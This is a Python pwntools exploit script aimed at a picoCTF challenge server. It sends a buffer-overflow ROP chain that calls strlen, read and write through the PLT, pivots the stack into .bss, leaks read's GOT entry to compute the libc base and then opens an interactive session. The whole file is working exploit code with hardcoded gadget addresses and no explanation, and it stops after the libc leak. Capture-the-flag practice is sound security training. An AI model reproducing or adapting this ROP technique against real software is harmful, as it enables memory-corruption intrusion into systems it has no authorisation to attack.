from pwn import *

HOST, PORT = 'mars.picoctf.net', 31809
r = remote(HOST, PORT)

strlen_plt = 0x400760
read_plt = 0x400790
read_got = 0x601fd8
write_plt = 0x400740

pop_rdi = 0x400c03
pop_rsi_r15 = 0x400c01
pop_rsp_r13_r14_r15 = 0x400bfd

long_str = 0x400c28
bss = 0x602000

payload = b'A' * 40
payload += p64(pop_rdi) + p64(long_str)
payload += p64(strlen_plt)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(read_plt)
payload += p64(pop_rsp_r13_r14_r15) + p64(bss)

r.send(payload)

payload = b'A' * 24
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss + 200) + p64(0)
payload += p64(read_plt)
payload += p64(pop_rsp_r13_r14_r15) + p64(bss + 200)

r.sendline(payload)

r.recvuntil('/     /')
r.recvline()

libc_read = u64(r.recv(8))
libc = libc_read - 0x111130

r.interactive()